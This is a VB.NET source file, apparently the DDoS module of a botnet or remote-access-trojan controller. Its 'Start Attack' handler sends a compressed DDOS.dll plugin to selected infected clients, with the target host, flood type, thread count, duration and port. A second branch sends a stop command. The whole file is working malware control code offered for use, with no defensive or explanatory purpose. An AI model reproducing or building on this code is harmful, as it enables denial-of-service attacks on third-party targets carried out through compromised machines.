Public Class Floods

    Public SPL = Main.SPL

    Private Sub MetroTile1_Click(sender As Object, e As EventArgs) Handles MetroTile1.Click

        Try
            If Main.L1.SelectedItems.Count > 0 Then
                If Flood_Attack.Text <> "" AndAlso Flood_Host.Text <> "" AndAlso Flood_Time.Text <> "" AndAlso Flood_Threads.Text <> "" Then
                    If MetroTile1.Text = "Start Attack" Then
                        MetroTile1.Text = "Stop"
                        Flood_Host.Enabled = False
                        Flood_Threads.Enabled = False
                        Flood_Time.Enabled = False
                        Flood_Attack.Enabled = False
                        Flood_Port.Enabled = False
                        For Each x As ListViewItem In Main.L1.SelectedItems
                            Main.S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "1" + "|'P'|" + Flood_Host.Text + "|'P'|" + Flood_Threads.Text + "|'P'|" + Flood_Time.Text + "|'P'|" + Flood_Port.Text)
                        Next
                    Else
                        MetroTile1.Text = "Please Wait.."
                        For Each x As ListViewItem In Main.L1.SelectedItems
                            Main.S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DDOS.dll"), True)) + SPL + Flood_Attack.Text + "|'P'|" + "2")
                        Next
                        MetroTile1.Text = "Start Attack"
                        Flood_Host.Enabled = True
                        Flood_Threads.Enabled = True
                        Flood_Time.Enabled = True
                        Flood_Attack.Enabled = True
                        Flood_Port.Enabled = True
                    End If
                End If
            Else
                MsgBox("Please Select Clients", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try

    End Sub

    Private Sub Floods_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.Hide()
        e.Cancel = True
    End Sub

    Private Sub Flood_Attack_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Flood_Attack.SelectedIndexChanged
        If Flood_Attack.Text = "UDP" Then
            MetroLabel3.Visible = True
            Flood_Port.Visible = True
        Else
            MetroLabel3.Visible = False
            Flood_Port.Visible = False
        End If
    End Sub
End Class